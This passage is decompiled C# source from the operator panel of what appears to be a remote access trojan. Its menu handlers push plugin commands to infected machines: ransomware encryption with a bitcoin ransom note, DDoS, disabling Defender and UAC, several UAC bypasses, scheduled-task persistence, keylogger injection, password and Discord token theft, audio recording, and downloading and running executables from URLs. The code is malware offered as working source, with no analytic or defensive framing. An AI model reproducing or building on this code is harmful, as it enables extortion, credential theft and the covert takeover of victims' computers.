				msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "stop";
				object lockReportWindowClients = Settings.LockReportWindowClients;
				lock (lockReportWindowClients)
				{
					foreach (Clients @object in Settings.ReportWindowClients)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000055D4 File Offset: 0x000055D4
		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "close";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000056A4 File Offset: 0x000056A4
		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00005774 File Offset: 0x00005774
		private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
						msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
						msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
						msgPack.ForcePathObject("Update").AsString = "true";
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						foreach (Clients clients in this.GetSelectedClients())
						{
							clients.LV.ForeColor = Color.Red;
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x000058F0 File Offset: 0x000058F0
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000059C0 File Offset: 0x000059C0
		private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = this.GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
				}
				else
				{
					foreach (Clients clients in selectedClients)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
						if (Directory.Exists(text))
						{
							Process.Start(text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00005A5C File Offset: 0x00005A5C
		private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00005B40 File Offset: 0x00005B40
		private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "shutdown";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00005C24 File Offset: 0x00005C24
		private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "logoff";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00005D08 File Offset: 0x00005D08
		private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormBlockClients formBlockClients = new FormBlockClients())
			{
				formBlockClients.ShowDialog();
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00005D44 File Offset: 0x00005D44
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00005D58 File Offset: 0x00005D58
		private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormFileSearcher formFileSearcher = new FormFileSearcher())
			{
				if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
					msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
					msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\FileSearcher.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00005EB8 File Offset: 0x00005EB8
		private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "information";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Information.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00005F9C File Offset: 0x00005F9C
		private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "dosAdd";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
					this.formDOS.Show();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x0000608C File Offset: 0x0000608C
		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					if (this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
						msgPack.ForcePathObject("Message").AsString = text;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Ransomware.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x000061B0 File Offset: 0x000061B0
		private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Password", "Password", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					if (this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "decrypt";
						msgPack.ForcePathObject("Password").AsString = text;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Ransomware.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000085 RID: 133 RVA: 0x000062D4 File Offset: 0x000062D4
		private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00006408 File Offset: 0x00006408
		private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormAudio)Application.OpenForms["Audio Recorder:" + clients.ID] == null)
					{
						new FormAudio
						{
							Name = "Audio Recorder:" + clients.ID,
							Text = "Audio Recorder:" + clients.ID,
							F = this,
							ParentClient = clients,
							Client = clients
						}.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000064CC File Offset: 0x000064CC
		private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uac";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x000065E4 File Offset: 0x000065E4
		private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x000066FC File Offset: 0x000066FC
		private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000067E0 File Offset: 0x000067E0
		private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Recovery.dll");
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
					}
					new HandleLogs().Addmsg("Recovering...", Color.Black);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x000068A8 File Offset: 0x000068A8
		private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Discord.dll");
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x0000695C File Offset: 0x0000695C
		private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00006A74 File Offset: 0x00006A74
		private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00006BA8 File Offset: 0x00006BA8
		private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00006CC0 File Offset: 0x00006CC0
		private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00006CC4 File Offset: 0x00006CC4
		private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormSetting formSetting = new FormSetting())
			{
				formSetting.ShowDialog();
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00006D00 File Offset: 0x00006D00
		private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("bin\\Keylogger.exe")));
				msgPack.ForcePathObject("Inject").AsString = "";
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Auto Keylogger:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00006EE8 File Offset: 0x00006EE8
		private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00006FCC File Offset: 0x00006FCC
		private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000071DC File Offset: 0x000071DC
		private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Netstat.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
					{
						new FormNetstat
						{
							Name = "Netstat:" + clients.ID,
							Text = "Netstat:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000072E8 File Offset: 0x000072E8
		private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
					msgPack.ForcePathObject("url").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00007408 File Offset: 0x00007408
		private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
					msgPack.ForcePathObject("url").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
